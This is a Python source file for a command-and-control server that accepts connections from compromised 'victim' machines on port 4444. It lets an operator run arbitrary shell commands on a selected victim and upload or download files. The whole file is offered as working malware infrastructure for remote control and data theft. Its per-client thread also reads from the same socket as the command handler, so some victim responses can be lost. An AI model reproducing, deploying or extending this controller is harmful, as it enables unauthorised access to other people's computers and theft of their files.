import socket
import threading
import struct
import os
import subprocess

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = []  # List of (id, socket, address)
        self.client_id = 0
        self.selected_id = None

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] C2 Server listening on {self.host}:{self.port} 😈")
        print("[*] Commands: list, select <id>, exit, or type any system command.")

    def handle_client(self, client_socket, addr):
        self.client_id += 1
        cid = self.client_id
        self.clients.append((cid, client_socket, addr))
        print(f"\n[+] New victim #{cid} connected from {addr}")

        while True:
            try:
                data = client_socket.recv(1024)
                if not data:
                    break
            except:
                break

        self.clients = [c for c in self.clients if c[0] != cid]
        print(f"\n[-] Victim #{cid} disconnected.")

    def send_to_victim(self, cid, command):
        for c in self.clients:
            if c[0] == cid:
                sock = c[1]
                try:
                    sock.send(command.encode())
                    return True
                except:
                    return False
        return False

    def recv_from_victim(self, cid, buffer_size=4096):
        for c in self.clients:
            if c[0] == cid:
                try:
                    return c[1].recv(buffer_size)
                except:
                    return b""
        return b""

    def start(self):
        accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        accept_thread.start()

        while True:
            cmd = input("C2> ").strip()
            if not cmd:
                continue

            if cmd.lower() == "exit":
                break

            elif cmd.lower() == "list":
                if not self.clients:
                    print("[!] No victims connected.")
                else:
                    print("Connected victims:")
                    for cid, _, addr in self.clients:
                        print(f"  #{cid} - {addr}")

            elif cmd.lower().startswith("select "):
                try:
                    self.selected_id = int(cmd.split(" ")[1])
                    exists = any(c[0] == self.selected_id for c in self.clients)
                    if exists:
                        print(f"[*] Now controlling victim #{self.selected_id}")
                    else:
                        print(f"[!] Victim #{self.selected_id} not found.")
                        self.selected_id = None
                except:
                    print("[!] Usage: select <id>")

            else:
                if self.selected_id is None:
                    print("[!] No victim selected. Use 'list' and 'select <id>' first.")
                    continue

                if cmd.lower().startswith("upload "):
                    parts = cmd.split(" ")
                    if len(parts) < 3:
                        print("[!] Usage: upload <local_file> <remote_path>")
                        continue
                    local_file = parts[1]
                    remote_path = parts[2]
                    self.upload_file(self.selected_id, local_file, remote_path)
                    continue

                elif cmd.lower().startswith("download "):
                    parts = cmd.split(" ")
                    if len(parts) < 3:
                        print("[!] Usage: download <remote_file> <local_path>")
                        continue
                    remote_file = parts[1]
                    local_path = parts[2]
                    self.download_file(self.selected_id, remote_file, local_path)
                    continue

                self.execute_command(self.selected_id, cmd)

    def execute_command(self, cid, command):
        if not self.send_to_victim(cid, command):
            print("[!] Failed to send command. Victim may be disconnected.")
            return

        response = self.recv_from_victim(cid)
        if response:
            try:
                print(response.decode(errors='ignore'))
            except:
                print(response)
        else:
            print("[!] No response or victim disconnected.")

    def upload_file(self, cid, local_path, remote_path):
        if not os.path.exists(local_path):
            print(f"[!] Local file {local_path} not found.")
            return
        if not os.path.isfile(local_path):
            print(f"[!] {local_path} is not a file.")
            return

        if not self.send_to_victim(cid, f"UPLOAD {remote_path}"):
            print("[!] Failed to send upload command.")
            return

        ack = self.recv_from_victim(cid)
        if b"READY" not in ack:
            print("[!] Victim not ready for upload.")
            return

        file_size = os.path.getsize(local_path)
        sock = None
        for c in self.clients:
            if c[0] == cid:
                sock = c[1]
                break
        if not sock:
            return

        sock.send(struct.pack('!Q', file_size))

        with open(local_path, 'rb') as f:
            sent = 0
            while sent < file_size:
                data = f.read(4096)
                if not data:
                    break
                sock.send(data)
                sent += len(data)

        print(f"[*] Uploaded {local_path} to victim as {remote_path}")

    def download_file(self, cid, remote_path, local_path):
        if not self.send_to_victim(cid, f"DOWNLOAD {remote_path}"):
            print("[!] Failed to send download command.")
            return

        sock = None
        for c in self.clients:
            if c[0] == cid:
                sock = c[1]
                break
        if not sock:
            return

        size_data = sock.recv(8)
        if len(size_data) < 8:
            print("[!] Invalid size header from victim.")
            return
        file_size = struct.unpack('!Q', size_data)[0]

        if file_size == 0:
            error = sock.recv(1024).decode()
            print(f"[!] Victim error: {error}")
            return

        with open(local_path, 'wb') as f:
            received = 0
            while received < file_size:
                chunk = sock.recv(min(4096, file_size - received))
                if not chunk:
                    break
                f.write(chunk)
                received += len(chunk)

        if received == file_size:
            print(f"[*] Downloaded {remote_path} from victim to {local_path}")
        else:
            print(f"[!] Download incomplete. Got {received}/{file_size}")

    def _accept_loop(self):
        while True:
            client_socket, addr = self.server.accept()
            client_socket.settimeout(60.0)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            t = threading.Thread(target=self.handle_client, args=(client_socket, addr))
            t.daemon = True
            t.start()

if __name__ == "__main__":
    server = C2Server()
    server.start()
